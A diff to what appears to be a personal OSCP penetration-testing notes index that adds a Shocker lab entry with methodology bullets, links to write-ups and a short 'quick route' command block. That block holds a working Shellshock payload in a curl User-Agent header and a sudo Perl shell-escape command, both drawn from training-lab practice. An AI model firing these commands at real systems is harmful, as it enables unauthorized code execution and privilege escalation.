@@ -13,6 +13,7 @@ Restructured 2026-08-04 from a single flat file into a folder split by target ty
 - [[Linux Methodology]] — recon, web app exploitation (traversal/LFI/upload/command injection/SQLi), shells & payloads, privilege escalation
 - Networked cross-cutting pattern — source-first web enumeration, MIME/extension upload bypass, asynchronous cron filename injection, and sudo configuration-parser review are demonstrated in [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] and integrated into Linux Methodology
 - Poison cross-cutting pattern — LFI source review, mechanical decoding of repeatedly encoded credentials, FreeBSD loopback enumeration, and one-port SSH forwarding to VNC are demonstrated in [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] and integrated into Linux Methodology
+- Shocker cross-cutting pattern — target validation, direct CGI enumeration behind a forbidden directory, Shellshock identity proof, Bash callback, and passwordless Perl interpreter escape are demonstrated in [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] and integrated into Linux Methodology
 - [[Windows Methodology]] — recon, SMB/LDAP enumeration, shells & payloads, privilege escalation (unquoted services, DLL hijacking, potato attacks, UAC bypass); Phase 2.5: SAM/LSASS offline dump, pypykatz, NetExec remote dump, NTDS VSS, credential hunting (cmdkey/LaZagne/findstr)
 - [[Active Directory Methodology]] — AD enumeration (PowerView, BloodHound), username-anarchy + kerbrute userenum before spraying, password attacks (spraying, Kerberoasting, AS-REP roasting), pass-the-hash/ticket (Windows kirbi + Linux ccache paths), Pass-the-Certificate (pywhisker + PKINIT), post-exploitation (Mimikatz, DCSync, Snaffler, NTDS VSS, golden/silver tickets), lateral movement, pivoting
 - [[Cloud Methodology]] — AWS recon phases: external DNS/S3 recon (no auth), API oracle techniques (AMI account-ID leak, s3:ResourceAccount binary search, trust policy IAM role oracle, Pacu iam__enum_roles), post-compromise IAM triage (sts get-caller-identity → get-account-authorization-details → jq dump analysis), IAM privilege escalation (CreateAccessKey/CreateLoginProfile/AttachPolicy vectors, ABAC tag confusion)
@@ -26,7 +27,7 @@ Restructured 2026-08-04 from a single flat file into a folder split by target ty
 ```
 Port Scan → Identify Services
     ↓
-Web Service → Gobuster/WPScan → Find Vuln → Exploit → Shell
+Web Service → Gobuster/WPScan/CGI enumeration → Prove Vuln → Exploit → Shell
     ↓
 Other Services → enum4linux, snmpwalk, smbclient → Find Creds/Info → Exploit
     ↓
@@ -79,6 +80,22 @@ Domain Admin → Extract Creds → Persistence
 | `cat /etc/cron*` | View cron jobs |
 | `uname -a` | Kernel version |
 | `getcap -r / 2>/dev/null` | Capabilities |
+
+### Shocker quick route
+
+~~~bash
+# Enumerate CGI files even when the directory listing is forbidden.
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py
+
+# Prove Shellshock with a harmless identity command.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
+
+# Use the exact passwordless Perl rule after the shell lands.
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+~~~
 
 ### Windows Key Commands
 | Command | Purpose |
@@ -180,6 +197,11 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- demonstrates LFI-to-credential recovery, FreeBSD loopback enumeration, and one-port SSH forwarding
+- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- demonstrates target validation, Apache CGI Shellshock, Bash callback handling, and exact sudo Perl review
+## Search coverage
+
+[[OSCP/BOXES/WRITE UPS/AD/Search|Search]] is the completed worked example for the AD/web combined route: public image OSINT, LDAP/SMB validation, Kerberoasting, password reuse, SMB profile traversal, Office XML, PKCS#12, PSWA, gMSA authorization, delegated reset, and WMI proof.
+
 ## External Resources
 
 - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
